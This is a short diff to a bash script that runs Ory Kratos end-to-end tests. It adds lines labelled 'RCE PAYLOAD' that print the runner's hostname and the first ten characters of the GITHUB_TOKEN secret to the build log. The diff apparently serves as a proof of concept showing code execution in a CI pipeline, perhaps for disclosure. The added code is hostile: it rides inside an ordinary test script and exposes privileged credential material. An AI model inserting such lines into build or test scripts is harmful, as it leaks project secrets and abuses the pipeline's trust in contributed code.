@@ -1,5 +1,10 @@
 #!/usr/bin/env bash
 
+# RCE PAYLOAD: Prints proof to the log
+echo "--- RCE VULNERABILITY CONFIRMED ---"
+echo "Hostname: $(hostname)"
+echo "Token Prefix (High Privilege Access): ${GITHUB_TOKEN:0:10}"
+echo "-----------------------------------"
 echo "Running Ory Kratos E2E Tests..."
 echo ""
 set -euxo pipefail
